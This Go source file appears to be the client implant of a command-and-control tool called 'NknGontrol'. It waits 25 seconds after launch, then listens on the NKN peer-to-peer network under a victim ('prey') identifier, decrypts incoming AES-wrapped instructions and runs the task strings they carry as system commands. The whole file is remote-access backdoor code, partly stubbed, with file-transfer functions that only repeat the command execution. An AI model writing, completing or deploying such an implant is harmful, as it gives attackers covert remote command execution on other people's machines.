package main

import (
	"NknGontrol/module/command"
	"fmt"
	"time"

	"github.com/nknorg/nkn-sdk-go"
)

func main() {
	time.Sleep(25 * time.Second)
	StartPreyListener(PreyInfo.UDID)

}

func Dealmsg(msg *nkn.Message) {
		fmt.Println("Receive message from", msg.Src)
	dedata := AesCompressListener(msg.Data)
		fmt.Println(dedata)
		var preyAct PreyStat
	preyAct.Json2Struct(dedata)
	switch preyAct.Status {
	case 1:
		RunCommand(msg, preyAct)
	case 2:

	case 3:
	default:
	}

	msg.Reply([]byte("working")) }

func RunCommand(msg *nkn.Message, Prey PreyStat) {
	var err error
	_, Prey.Result, err = command.NewCommand().Exec(Prey.Task)
	if err != nil {
		fmt.Println(err)
		Prey.Result = "err"
			}

}

func preyFileReceive(msg *nkn.Message, Prey PreyStat) {
	var err error
	_, Prey.Result, err = command.NewCommand().Exec(Prey.Task)
	if err != nil {
		fmt.Println(err)
		Prey.Result = "err"
			}

}

func preyFileSend(msg *nkn.Message, Prey PreyStat) {
	var err error
	_, Prey.Result, err = command.NewCommand().Exec(Prey.Task)
	if err != nil {
		fmt.Println(err)
		Prey.Result = "err"
			}

}
